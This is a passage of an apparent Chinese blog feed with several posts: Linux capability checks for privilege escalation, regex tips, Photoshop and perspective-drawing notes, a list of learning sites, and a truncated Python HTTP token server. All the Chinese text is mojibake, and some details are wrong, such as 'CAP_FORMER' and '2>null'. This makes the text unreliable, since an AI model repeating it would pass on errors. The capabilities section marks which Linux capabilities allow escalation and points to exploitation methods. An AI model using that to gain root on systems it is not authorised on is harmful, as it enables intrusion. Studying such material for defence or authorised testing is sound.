<span class="hljs-regexp">/proc/</span><span class="hljs-number">1234</span>/status | grep Cap  <span class="hljs-comment"># æŸ¥çœ‹1234è¿›ç¨‹çš„èƒ½åŠ›</span></span><span class="line">cat <span class="hljs-regexp">/proc/</span>$$/status | grep Cap <span class="hljs-comment"># æŸ¥çœ‹ç°åœ¨è¿›ç¨‹çš„èƒ½åŠ›</span></span></code></pre></div></div><ul><li>è§£ç CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-routeros codeBlockLines"><span class="line">capsh <span class="hljs-attribute">--decode</span>=0000000000003000</span><span class="line"><span class="hljs-attribute">0x0000000000003000</span>=cap_net_admin,cap_net_raw</span></code></pre></div></div><h3 id="äºŒè¿›åˆ¶æ–‡ä»¶CAP"><a href="#äºŒè¿›åˆ¶æ–‡ä»¶CAP" class="headerlink" title="äºŒè¿›åˆ¶æ–‡ä»¶CAP"></a>äºŒè¿›åˆ¶æ–‡ä»¶CAP</h3><ul><li>æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-awk codeBlockLines"><span class="line">getcap <span class="hljs-regexp">/usr/</span>bin/ping</span><span class="line">getcap `whereis python3`</span></code></pre></div></div><ul><li>æœç´¢æ‰€æœ‰äºŒè¿›åˆ¶æ–‡ä»¶çš„CAP</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-1c codeBlockLines"><span class="line">getcap -r / <span class="hljs-number">2</span>&gt;<span class="hljs-literal">null</span></span></code></pre></div></div><p>åœ¨<code>LinPEAS</code>ä¸­æœ‰è‡ªåŠ¨æ£€æŸ¥</p><h2 id="å¦‚ä½•åˆ©ç”¨"><a href="#å¦‚ä½•åˆ©ç”¨" class="headerlink" title="å¦‚ä½•åˆ©ç”¨"></a>å¦‚ä½•åˆ©ç”¨</h2><p>æ ¹æ®ä¸åŒçš„CAPæ‰¾å‡ºå¯¹åº”çš„ææƒæ–¹æ³•ï¼Œè¯¦ç»†æ–¹æ³•åœ¨<a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#malicious-use">è¿™é‡ŒæŸ¥çœ‹</a></p><table><thead><tr><th align="center">CAP</th><th align="center">æè¿°</th><th align="center">èƒ½å¦ææƒ</th></tr></thead><tbody><tr><td align="center">CAP_SYS_ADMIN</td><td align="center">å¯ä»¥æŒ‚åœ¨æ–‡ä»¶ç³»ç»Ÿ</td><td align="center">âˆš</td></tr><tr><td align="center">CAP_SYS_PTRACE</td><td align="center">å¯ä»¥shellcodeæ³¨å…¥å¹¶é€ƒç¦»å®¹å™¨</td><td align="center">âˆš</td></tr><tr><td align="center">CAP_SYS_MODULE</td><td align="center">å¯ä»¥å¢åŠ æˆ–è€…ç§»é™¤æ ¸å¿ƒæ¨¡å—</td><td align="center">âˆš</td></tr><tr><td align="center">CAP_DAC_READ_SEARCH</td><td align="center">å¯ä»¥ç»•è¿‡æŸ¥çœ‹æ–‡ä»¶å’Œæ‰§è¡Œæ–‡ä»¶çš„æ£€æŸ¥</td><td align="center">âˆš</td></tr><tr><td align="center">CAP_DAC_OVERRIDE</td><td align="center">å†™ä»»æ„æ–‡ä»¶</td><td align="center">âˆš</td></tr><tr><td align="center">CAP_CHOWN</td><td align="center">æ›´æ”¹ä»»æ„æ–‡ä»¶çš„æ‰€æœ‰è€…</td><td align="center">âˆš</td></tr><tr><td align="center">CAP_FORMER</td><td align="center">æ›´æ”¹ä»»æ„æ–‡ä»¶çš„æƒé™</td><td align="center">âˆš</td></tr><tr><td align="center">CAP_SETUID</td><td align="center">è®¾ç½®æœ‰æ•ˆç”¨æˆ·</td><td align="center">âˆš</td></tr><tr><td align="center">CAP_SETGID</td><td align="center">è®¾ç½®æœ‰æ•ˆç»„</td><td align="center">âˆš</td></tr><tr><td align="center">CAP_SETFCAP</td><td align="center">å¯ä»¥è®¾ç½®æ–‡ä»¶æˆ–è€…è¿›ç¨‹çš„CAP</td><td align="center">âˆš</td></tr><tr><td align="center">CAP_KILL</td><td align="center">å¯ä»¥æ€æ­»ä»»ä½•è¿›ç¨‹</td><td align="center">Ã—</td></tr><tr><td align="center">CAP_NET_BIND_SERVICE</td><td align="center">å¯ä»¥ç›‘å¬ä»»ä½•ç«¯å£</td><td align="center">Ã—</td></tr><tr><td align="center">CAP_NET_RAW</td><td align="center">å¯ä»¥å—…æ¢æ¥å£</td><td align="center">Ã—</td></tr><tr><td align="center">CAP_NET_ADMIN + CAP_NET_RAW</td><td align="center">å¯ä»¥ä¿®æ”¹é˜²æŠ¤å¢™è§„åˆ™</td><td align="center">Ã—</td></tr><tr><td align="center">CAP_LINUX_IMMUTABLE</td><td align="center">ä¿®æ”¹inodeå±æ€§</td><td align="center">Ã—</td></tr></tbody></table><h2 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h2><h3 id="python-æ‹¥æœ‰-CAP-SETUID"><a href="#python-æ‹¥æœ‰-CAP-SETUID" class="headerlink" title="python æ‹¥æœ‰ CAP_SETUID"></a>python æ‹¥æœ‰ CAP_SETUID</h3><p><img src="/2021/07/21/linux-capabilities/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€ </category>
          
          <category> çŸ¥è¯†ç‚¹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> ææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­£åˆ™è¡¨è¾¾å¼</title>
      <link href="/2021/07/19/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2021/07/19/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://wangwl.net/static/projects/visualRegex">ä¸€ä¸ªå¯è§†åŒ–çš„æ­£åˆ™è¡¨è¾¾å¼åœ¨çº¿æµ‹è¯•ç½‘ç«™</a></li></ul><h2 id="IPv4"><a href="#IPv4" class="headerlink" title="IPv4"></a>IPv4</h2><ul><li>åŒ¹é…æ¯ä¸ªå€¼</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">^(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.(\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))$</span></code></pre></div></div><ul><li>åªåšéªŒè¯åˆ¤æ–­</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">^(?:(?:\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))\.)&#123;3&#125;(?:\d|[1-9]\d|1\d\d|2(?:[0-4]\d|5[0-5]))$</span></code></pre></div></div><h2 id="å¤šè¡ŒåŒ¹é…"><a href="#å¤šè¡ŒåŒ¹é…" class="headerlink" title="å¤šè¡ŒåŒ¹é…"></a>å¤šè¡ŒåŒ¹é…</h2><p>å½“éœ€è¦è·¨è¡ŒåŒ¹é…çš„æ—¶å€™ï¼Œç”±äº<code>(.)</code>ä¸èƒ½åŒ¹é…<code>\n</code>æ‰€ä»¥æ— æ³•å¤šè¡ŒåŒ¹é…</p><p>ä¾‹å¦‚:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>comment = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;/\*(.*?)\*/&#x27;</span>)</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>text1 = <span class="hljs-string">&#x27;/* this is a comment */&#x27;</span></span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>text2 = <span class="hljs-string">&#x27;&#x27;&#x27;/* this is a</span></span><span class="line"><span class="hljs-string"><span class="hljs-meta">... </span>multiline comment */</span></span><span class="line"><span class="hljs-string"><span class="hljs-meta">... </span>&#x27;&#x27;&#x27;</span></span><span class="line">&gt;&gt;&gt;</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>comment.findall(text1)</span><span class="line">[<span class="hljs-string">&#x27; this is a comment &#x27;</span>]</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>comment.findall(text2)</span><span class="line">[]</span><span class="line">&gt;&gt;&gt;</span></code></pre></div></div><p>è¦ä¿®æ­£è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦åŠ ä¸€ä¸ªéæ•è·ç»„<code>(?:.|\n)</code>æ¥å°†<code>\n</code>ä¹ŸåŒ…å«è¿›æ¥</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>comment = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;/\*((?:.|\n)*?)\*/&#x27;</span>)</span><span class="line"><span class="hljs-meta">&gt;&gt;&gt; </span>comment.findall(text2)</span><span class="line">[<span class="hljs-string">&#x27; this is a\n multiline comment &#x27;</span>]</span><span class="line">&gt;&gt;&gt;</span></code></pre></div></div><p>å¦å¤–ä¹Ÿå¯ä»¥ä½¿ç”¨<code>re.DOTALL</code>è¿™ä¸ªæ ‡å¿—ï¼Œå®ƒå¯ä»¥å°†<code>(.)</code>åŒ¹é…ä»»æ„å­—ç¬¦ï¼Œå½“ç„¶ä¹Ÿå°±åŒ…å«äº†<code>\n</code>ï¼Œä½†æ˜¯ç”±äºåŒ…å«çš„ä¿¡æ¯æ›´å¤šï¼Œåœ¨å¤æ‚æƒ…å†µä¸‹å¯èƒ½ä¼šå‡ºç°æ„æƒ³ä¸åˆ°çš„æƒ…å†µï¼Œæ‰€ä»¥ä¼˜å…ˆä½¿ç”¨éæ•è·ç»„çš„æ–¹å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ </p><h2 id="éæ•è·å’Œå‘½åç»„"><a href="#éæ•è·å’Œå‘½åç»„" class="headerlink" title="éæ•è·å’Œå‘½åç»„"></a>éæ•è·å’Œå‘½åç»„</h2><ul><li>éæ•è·çš„ç”¨æ³•æ˜¯<code>(?:.*)</code></li><li>å‘½åç»„çš„ç”¨æ³•æ˜¯<code>(?P&lt;name&gt;)</code></li></ul><p>ä¸¾ä¸ªä¾‹å­ï¼Œè¦å–ä¸€ä¸ªIP:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">import</span> re</span><span class="line">file = <span class="hljs-string">&#x27;A_FOO_BAR_DR01_127.0.0.1_20220221180010.diag&#x27;</span></span><span class="line">reg = <span class="hljs-string">r&#x27;(?P&lt;name&gt;\S+)\_(?P&lt;ip&gt;(?:\d+\.)&#123;3&#125;(?:\d+)).*&#x27;</span></span><span class="line"></br></span><span class="line">match = re.match(reg, file)</span><span class="line"><span class="hljs-built_in">print</span>(match.group(name))</span><span class="line"><span class="hljs-built_in">print</span>(match[<span class="hljs-string">&#x27;ip&#x27;</span>])</span><span class="line"><span class="hljs-comment">## output:</span></span><span class="line"><span class="hljs-comment"># A_FOO_BAR_DR01</span></span><span class="line"><span class="hljs-comment"># 127.0.0.1</span></span></code></pre></div></div><h2 id="å¯¹æ­£åˆ™åˆ†ç»„çš„æ›¿æ¢"><a href="#å¯¹æ­£åˆ™åˆ†ç»„çš„æ›¿æ¢" class="headerlink" title="å¯¹æ­£åˆ™åˆ†ç»„çš„æ›¿æ¢"></a>å¯¹æ­£åˆ™åˆ†ç»„çš„æ›¿æ¢</h2><p><code>\g</code>å¯ä»¥ç”¨æ¥æ›¿æ¢æ­£åˆ™åˆ†ç»„çš„å†…å®¹ï¼Œä¾‹å¦‚:</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pascal_case_to_snake_case</span>(<span class="hljs-params">camel_case: <span class="hljs-built_in">str</span></span>):</span></span><span class="line">    <span class="hljs-string">&quot;&quot;&quot;å¤§é©¼å³°ï¼ˆå¸•æ–¯å¡ï¼‰è½¬è›‡å½¢</span></span><span class="line"></br></span><span class="line"><span class="hljs-string">    &gt;&gt;&gt; pascal_case_to_snake_case(&#x27;HuaweiVrpDisplayVersion&#x27;)</span></span><span class="line"><span class="hljs-string">    &#x27;huawei_vrp_display_version&#x27;</span></span><span class="line"><span class="hljs-string">    &quot;&quot;&quot;</span></span><span class="line">    snake_case = re.sub(<span class="hljs-string">r&quot;(?P&lt;key&gt;[A-Z])&quot;</span>, <span class="hljs-string">r&quot;_\g&lt;key&gt;&quot;</span>, camel_case)</span><span class="line">    <span class="hljs-keyword">return</span> snake_case.lower().strip(<span class="hljs-string">&#x27;_&#x27;</span>)</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PSåæœŸæ–¹é¢</title>
      <link href="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/"/>
      <url>/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://www.bilibili.com/video/BV1ca4y1s7gY">å‚è€ƒè§†é¢‘</a></li></ul><h1 id="é€šé€"><a href="#é€šé€" class="headerlink" title="é€šé€"></a>é€šé€</h1><h2 id="åŸè‰²åŸç†"><a href="#åŸè‰²åŸç†" class="headerlink" title="åŸè‰²åŸç†"></a>åŸè‰²åŸç†</h2><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/1.png"></p><p>æ»¤è‰²æ¨¡å¼å°±æ˜¯åŠ è‰²æ¨¡å¼ï¼Œå°±æ˜¯å…‰çš„ä¸‰åŸè‰²çš„åŠ è‰²</p><p>RGBä¸CMYæœ‰ç€éå¸¸ç´§å¯†çš„è”ç³»</p><table><thead><tr><th align="center">åŸè‰²</th><th align="center">æ”¯æŒè‰²</th><th align="center">äº’è¡¥è‰²</th></tr></thead><tbody><tr><td align="center">çº¢</td><td align="center">é»„ï¼Œå“çº¢</td><td align="center">é’</td></tr><tr><td align="center">ç»¿</td><td align="center">é»„ï¼Œé’</td><td align="center">å“çº¢</td></tr><tr><td align="center">è“</td><td align="center">é’ï¼Œå“çº¢</td><td align="center">é»„</td></tr></tbody></table><p>å»é™¤äº’è¡¥è‰²å¹²æ‰°</p><h2 id="ä»€ä¹ˆæ˜¯è‰²å½©è„ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯è‰²å½©è„ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯è‰²å½©è„ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯è‰²å½©è„ï¼Ÿ</h2><p>è‰²å½©è„æ˜¯å› ä¸ºåŠ å…¥äº†äº’è¡¥è‰²</p><p>æ¯”å¦‚è“è‰²ä¸é»„è‰²ä¸ºäº’è¡¥è‰²ï¼Œé‚£ä¹ˆè°ƒä½ä¸é€æ˜åº¦å°±ä¼šæˆä¸ºç°è‰²</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/2.png"></p><h1 id="å½±è°ƒ"><a href="#å½±è°ƒ" class="headerlink" title="å½±è°ƒ"></a>å½±è°ƒ</h1><h2 id="å½±è°ƒçš„åˆ’åˆ†ç³»ç»Ÿ"><a href="#å½±è°ƒçš„åˆ’åˆ†ç³»ç»Ÿ" class="headerlink" title="å½±è°ƒçš„åˆ’åˆ†ç³»ç»Ÿ"></a>å½±è°ƒçš„åˆ’åˆ†ç³»ç»Ÿ</h2><p>ä¸€èˆ¬æ¥è¯´æ˜¯ä¸‰å¤§è°ƒï¼šé»‘ç™½ç°</p><p>å…·ä½“æ¥è¯´æœ‰ä¸¤ç§æ–¹å¼è¡¨è¾¾ï¼š</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/3.png"></p><p>ä»¥åŠ</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/4.png"></p><p>é‚£ä¹ˆè¿™ä¸¤ç§å°±ä¼šæ’åˆ—ç»„åˆæˆ9ç§å½±è°ƒä»¥åŠ1ä¸ªå…¨é•¿è°ƒ</p><p><img src="/2021/07/18/PS%E5%90%8E%E6%9C%9F%E6%96%B9%E9%9D%A2/5.png"></p><h2 id="é»‘ç™½ç¨¿ç”»çš„æ˜¯ä»€ä¹ˆ"><a href="#é»‘ç™½ç¨¿ç”»çš„æ˜¯ä»€ä¹ˆ" class="headerlink" title="é»‘ç™½ç¨¿ç”»çš„æ˜¯ä»€ä¹ˆ"></a>é»‘ç™½ç¨¿ç”»çš„æ˜¯ä»€ä¹ˆ</h2><p>åœ¨ç”»é»‘ç™½ç¨¿çš„æ—¶å€™ï¼Œå°±æ˜¯åœ¨ç¡®å®šå½±è°ƒçš„è¿‡ç¨‹ã€‚</p><p>æ˜¯æ•´ä½“åæš—çš„ä½ä¸­è°ƒï¼Œè¿˜æ˜¯æ¯”è¾ƒå¹³å‡ä¸­é•¿è°ƒï¼Œè¿˜æ˜¯æ˜äº®çš„é«˜ä¸­è°ƒï¼Ÿ</p><h2 id="è¿˜æœ‰å“ªäº›è°ƒå¼"><a href="#è¿˜æœ‰å“ªäº›è°ƒå¼" class="headerlink" title="è¿˜æœ‰å“ªäº›è°ƒå¼"></a>è¿˜æœ‰å“ªäº›è°ƒå¼</h2><ul><li>é«˜è°ƒã€ä¸­é—´è°ƒã€ä½è°ƒ</li><li>è½¯è°ƒã€ç¡¬è°ƒ</li><li>å†·è°ƒã€æš–è°ƒ</li><li>å¯¹æ¯”è‰²è°ƒã€è°ƒå’Œè‰²è°ƒ</li><li>çº¯è°ƒã€ç°è°ƒ</li></ul><h1 id="é”åŒ–"><a href="#é”åŒ–" class="headerlink" title="é”åŒ–"></a>é”åŒ–</h1><h2 id="å¿ƒç†ä¸Šçš„æ„Ÿå—"><a href="#å¿ƒç†ä¸Šçš„æ„Ÿå—" class="headerlink" title="å¿ƒç†ä¸Šçš„æ„Ÿå—"></a>å¿ƒç†ä¸Šçš„æ„Ÿå—</h2><p>å‘è™šçš„è½®å»“è®©äººæ„Ÿåˆ°ç€æ€¥ï¼Œçœ‹ä¸æ¸…</p><h2 id="å¦‚ä½•åšä¸¤çº§ç²¾ç»†åŒ–å¤„ç†"><a href="#å¦‚ä½•åšä¸¤çº§ç²¾ç»†åŒ–å¤„ç†" class="headerlink" title="å¦‚ä½•åšä¸¤çº§ç²¾ç»†åŒ–å¤„ç†"></a>å¦‚ä½•åšä¸¤çº§ç²¾ç»†åŒ–å¤„ç†</h2><ol><li>é€‰æ‹©é¢œè‰²æ¨¡å¼ä¸ºlabæ¨¡å¼</li><li>åœ¨é€šé“ä¸­åªé€‰æ‹©æ˜åº¦é€šé“</li><li>USMé”åŒ–åšä¸¤æ¬¡ï¼ˆåŠå¾„ï¼š5ï¼Œ 1.2ï¼‰</li><li>å›åˆ°RGBæ¨¡å¼ä¸æ‹¼åˆå³å¯</li></ol><h1 id="å¡‘é€ å…‰çº¿"><a href="#å¡‘é€ å…‰çº¿" class="headerlink" title="å¡‘é€ å…‰çº¿"></a>å¡‘é€ å…‰çº¿</h1><p>ä¸¤ç§æ–¹å¼</p><ol><li>ç”»ç¬”</li><li>å¾„å‘æ¨¡ç³Š</li></ol><h2 id="å¾„å‘æ¨¡ç³Š"><a href="#å¾„å‘æ¨¡ç³Š" class="headerlink" title="å¾„å‘æ¨¡ç³Š"></a>å¾„å‘æ¨¡ç³Š</h2><ol><li>è‰²é˜¶è°ƒæ•´åˆ°åªæœ‰å…‰æº</li><li>å¾„å‘æ¨¡ç³Š</li><li>æ»¤è‰²æ¨¡å¼</li></ol>]]></content>
      
      
      <categories>
          
          <category> ç»˜ç”» </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å­¦ä¹ ç¼–ç¨‹çš„ç½‘ç«™</title>
      <link href="/2021/07/17/%E5%AD%A6%E4%B9%A0%E7%BC%96%E7%A8%8B%E7%9A%84%E7%BD%91%E7%AB%99/"/>
      <url>/2021/07/17/%E5%AD%A6%E4%B9%A0%E7%BC%96%E7%A8%8B%E7%9A%84%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<p>1.cppreference<br><a href="https://en.cppreference.com/w/">https://en.cppreference.com/w/</a></p><p>2.LearnCpp<br><a href="https://www.learncpp.com/">https://www.learncpp.com/</a></p><p>3.Cplusplus<br><a href="http://www.cplusplus.com/">http://www.cplusplus.com/</a></p><p>4.TutorialsPoint<br><a href="https://www.tutorialspoint.com/cplusplus/index.htm">https://www.tutorialspoint.com/cplusplus/index.htm</a></p><p>5.Awesome C++<br><a href="https://github.com/fffaraz/awesome-cpp">https://github.com/fffaraz/awesome-cpp</a></p><p>6ã€ä¹¦æ ˆç½‘<br><a href="https://www.bookstack.cn/">https://www.bookstack.cn/</a></p><p>7.ç‰›å®¢ç½‘<br><a href="https://www.nowcoder.com/activity/oj">https://www.nowcoder.com/activity/oj</a></p><p>8.æ¬ä¹¦åŒ <br><a href="http://www.banshujiang.cn/">http://www.banshujiang.cn/</a></p><p>9.ç¨‹åºå‘˜åˆ·é¢˜ç½‘ç«™ï¼šLintCode é¢†æ‰£<br><a href="https://www.lintcode.com/problem/">https://www.lintcode.com/problem/</a></p><p>10ã€LeetCode/LintCode é¢˜è§£ç½‘ç«™<br><a href="https://www.jiuzhang.com/solution/?utm_source=sc-zhihu-jw0603">https://www.jiuzhang.com/solution/?utm_source=sc-zhihu-jw0603</a></p><p>11ã€å‰ç«¯ç•Œçš„Dribbbleâ€”â€”Codepen<br><a href="https://codepen.io/">https://codepen.io/</a></p><p>12ã€TheServerSide<br><a href="https://www.theserverside.com/">https://www.theserverside.com/</a></p><p>13ã€Hacker News<br><a href="http://hackernews.betacat.io/">http://hackernews.betacat.io/</a></p><p>14ã€karan/Projects<br><a href="https://www.gitmemory.com/karan/Projects">https://www.gitmemory.com/karan/Projects</a></p><p>15.å­—ä½“åŠ¨æ•ˆç¥å™¨Space Type Generator<br><a href="https://spacetypegenerator.com/">https://spacetypegenerator.com/</a></p><p>16.å¤§å­¦è‡ªå­¦ç½‘<br><a href="http://v.dxsbb.com/">http://v.dxsbb.com/</a></p><p>17.ç®€å•æ•™ç¨‹<br><a href="https://www.twle.cn/">https://www.twle.cn/</a></p><ul><li><a href="https://www.bilibili.com/video/BV1d44y1q76P">å‚è€ƒæ¥æº</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€è§†å…³ç³»</title>
      <link href="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/"/>
      <url>/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[<p>å…³äºé€è§†çš„æ•™å­¦ï¼Œå‚è€ƒäº†<a href="https://www.bilibili.com/video/BV11t411m7Fk">è¿™ä¸ªè§†é¢‘</a>ã€‚</p><p>é€è§†ä¸­æœ€é‡è¦çš„ä¸€ç‚¹æ˜¯ç¡®å®š<code>è§‚å¯Ÿç‚¹</code>ï¼Œæœ‰äº†è§‚å¯Ÿç‚¹ï¼Œå°±æœ‰äº†<code>è§†å¹³çº¿</code>xè½´ä¸<code>å‚ç›´çº¿</code>yè½´ã€‚</p><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/1.png"></p><h2 id="è§†å¹³çº¿"><a href="#è§†å¹³çº¿" class="headerlink" title="è§†å¹³çº¿"></a>è§†å¹³çº¿</h2><p>æ‰€æœ‰å¹³è¡Œäºåœ°é¢çš„çº¿æœ€ç»ˆéƒ½ä¼šæ±‡èšåˆ°è§†å¹³çº¿ä¸Š </p><h2 id="ç”»é¢"><a href="#ç”»é¢" class="headerlink" title="ç”»é¢"></a>ç”»é¢</h2><p>åªè¦æ˜¯ç‰©ä½“çš„çº¿ä¸ä¸ç”»é¢å¹³è¡Œï¼Œé‚£ä¹ˆå°±ä¼šå‘ç”Ÿæ±‡èš</p><h2 id="æµ‹å®šæ·±åº¦"><a href="#æµ‹å®šæ·±åº¦" class="headerlink" title="æµ‹å®šæ·±åº¦"></a>æµ‹å®šæ·±åº¦</h2><p>3ç§æ–¹æ³•:</p><ol><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/2.png"></p></li><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/3.png"></p></li><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/4.png"></p></li><li><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/5.png"></p></li></ol><p>åŸç†éƒ½æ˜¯åˆ©ç”¨äº†å¹³è¡Œçº¿éƒ½æ˜¯åŒä¸€ä¸ªæ¶ˆå¤±ç‚¹å’Œç­‰æ¯”ä¸‰è§’å½¢ã€‚</p><h2 id="æ–œé¢"><a href="#æ–œé¢" class="headerlink" title="æ–œé¢"></a>æ–œé¢</h2><p>æœ‰åŒä¸€ä¸ªå‚ç›´æ¶ˆå¤±çº¿</p><p><img src="/2021/07/17/%E9%80%8F%E8%A7%86%E5%85%B3%E7%B3%BB/6.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç»˜ç”» </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python http</title>
      <link href="/2021/07/16/python-http/"/>
      <url>/2021/07/16/python-http/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP-Server"><a href="#HTTP-Server" class="headerlink" title="HTTP Server"></a>HTTP Server</h2><p>å‚è€ƒä¸€ä¸ªå®Œæ•´çš„æœåŠ¡ç«¯é…ç½®</p><div class="codeBlockContainer"><div class="codeBlockTitle">server.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment">#!/usr/bin/env python3</span></span><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-string">Very simple HTTP server in python for logging requests</span></span><span class="line"><span class="hljs-string">Usage::</span></span><span class="line"><span class="hljs-string">    ./server.py [&lt;port&gt;]</span></span><span class="line"><span class="hljs-string">&quot;&quot;&quot;</span></span><span class="line"><span class="hljs-keyword">from</span> http.server <span class="hljs-keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><span class="line"><span class="hljs-keyword">import</span> logging</span><span class="line"></br></span><span class="line">token = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;token&quot;</span>).read().strip()</span><span class="line"></br></span><span class="line"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span>(<span class="hljs-params">BaseHTTPRequestHandler</span>):</span></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">_set_response</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        self.send_response(<span class="hljs-number">200</span>)</span><span class="line">        self.send_header(<span class="hljs-string">&#x27;Content-type&#x27;</span>, <span class="hljs-string">&#x27;text/html&#x27;</span>)</span><span class="line">        self.end_headers()</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_GET</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        logging.info(<span class="hljs-string">&quot;GET request,\nPath: %s\nHeaders:\n%s\n&quot;</span>, <span class="hljs-built_in">str</span>(self.path), <span class="hljs-built_in">str</span>(self.headers))</span><span class="line">        self._set_response()</span><span class="line">        self.wfile.write(<span class="hljs-string">&quot;GET request for &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(self.path).encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line"></br></span><span class="line">    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_POST</span>(<span class="hljs-params">self</span>):</span></span><span class="line">        content_length = <span class="hljs-built_in">int</span>(self.headers[<span class="hljs-string">&#x27;Content-Length&#x27;</span>]) <span class="hljs-comment"># &lt;--- Gets the size of data</span></span><span class="line">        post_data = self.rfile.read(content_length) <span class="hljs-comment"># &lt;--- Gets the data itself</span></span><span class="line">        logging.info(<span class="hljs-string">&quot;POST request, Body:\n%s\n&quot;</span>, post_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line"></br></span><span class="line">        self._set_response()</span><span class="line"></br></span><span class="line">        <span class="hljs-keyword">if</span> (post_data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>) == <span class="hljs-string">f&quot;token=<span class="hljs-subst">&#123;token&#125;</span>&quot;</span>):</span><span class="line">            logging.info(<span class="hljs-string">&quot;[+] Token Success\n&quot;</span>)</span><span class="line">            self.wfile.write(<span class="hljs-string">&quot;Token Success&quot;</span>.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))</span><span class="line">        <span class="hljs-keyword">else</span>:</span><span class="line">            logging.info(<span class="hljs-string">&quot;[-] Token 